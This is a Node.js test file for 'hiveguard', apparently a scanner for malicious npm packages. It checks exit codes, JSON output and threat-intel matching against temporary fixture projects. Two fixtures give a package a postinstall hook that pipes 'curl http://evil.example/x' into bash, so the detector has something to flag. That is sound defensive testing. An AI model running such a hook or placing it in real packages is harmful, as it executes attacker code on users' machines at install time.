'use strict';

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const BIN = path.resolve(__dirname, '..', 'bin', 'hiveguard.js');

describe('hiveguard CLI (end to end, offline)', () => {
  let tmp;
  before(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-cli-')); });
  after(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  const write = (p, c) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
  const lockfile = (pkgs) => JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, ...Object.fromEntries(pkgs.map(([n, v]) => [`node_modules/${n}`, { version: v }])) } });

  function run(projectDir, extra = []) {
    const out = path.join(tmp, 'out-' + path.basename(projectDir));
    const r = spawnSync(process.execPath, [BIN, '--offline', '--no-secrets', '--json', '--scan-dirs', projectDir, '--output', out, ...extra],
      { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024, env: { ...process.env, HOME: tmp, USERPROFILE: tmp } });
    return { code: r.status, json: JSON.parse(r.stdout), stderr: r.stderr };
  }

  it('exits 0 with valid JSON for a clean project', () => {
    const proj = path.join(tmp, 'clean');
    write(path.join(proj, 'package-lock.json'), lockfile([['left-pad', '1.3.0']]));
    const r = run(proj);
    assert.equal(r.code, 0);
    assert.equal(r.json.summary.findings_total, 0);
    assert.equal(r.json.meta.version, require('../package.json').version);
    assert.equal(r.json.threat_intel.sources.osv.status, 'skipped');
    assert.equal(r.json.threat_intel.sources.bumblebee.status, 'skipped');
  });

  it('exits 1 for a high/critical finding without a threat-intel match', () => {
    const proj = path.join(tmp, 'script');
    write(path.join(proj, 'package-lock.json'), lockfile([['evil', '1.0.0']]));
    write(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
    const r = run(proj);
    assert.equal(r.code, 1);
    assert.ok(r.json.findings.some(f => f.type === 'suspicious_lifecycle_script'));
  });

  it('exits 2 when a package matches a threat-intel catalog', () => {
    const proj = path.join(tmp, 'match');
    const intel = path.join(tmp, 'intel');
    write(path.join(proj, 'package-lock.json'), lockfile([['compromised-pkg', '6.6.6']]));
    write(path.join(intel, 'test.json'), JSON.stringify({ _comment: 'Test campaign', entries: [{ ecosystem: 'npm', package: 'compromised-pkg', versions: ['6.6.6'] }] }));
    const r = run(proj, ['--custom-intel', intel]);
    assert.equal(r.code, 2);
    assert.equal(r.json.threat_matches.length, 1);
  });
});

describe('run.sh bootstrap', { skip: process.platform === 'win32' }, () => {
  const RUN_SH = path.resolve(__dirname, '..', 'run.sh');

  it('exits 3 with a message when the output directory cannot be created', () => {
    const r = spawnSync('bash', [RUN_SH, '--offline', '--output', '/proc/hiveguard-cannot-create'], { encoding: 'utf8' });
    assert.equal(r.status, 3);
    assert.match(r.stderr, /cannot create output directory/);
    assert.equal(r.stdout, '');
  });

  it('passes the scanner exit code through and keeps stdout pure JSON', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-runsh-'));
    try {
      const proj = path.join(tmp, 'p');
      fs.mkdirSync(path.join(proj, 'node_modules', 'evil'), { recursive: true });
      fs.writeFileSync(path.join(proj, 'package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, 'node_modules/evil': { version: '1.0.0' } } }));
      fs.writeFileSync(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
      const r = spawnSync('bash', [RUN_SH, '--offline', '--no-secrets', '--json', '--scan-dirs', proj, '--output', path.join(tmp, 'out')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
      assert.equal(r.status, 1);
      assert.ok(JSON.parse(r.stdout).findings.length > 0);
      assert.ok(fs.existsSync(path.join(tmp, 'out', 'hiveguard-bootstrap.log')));
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});
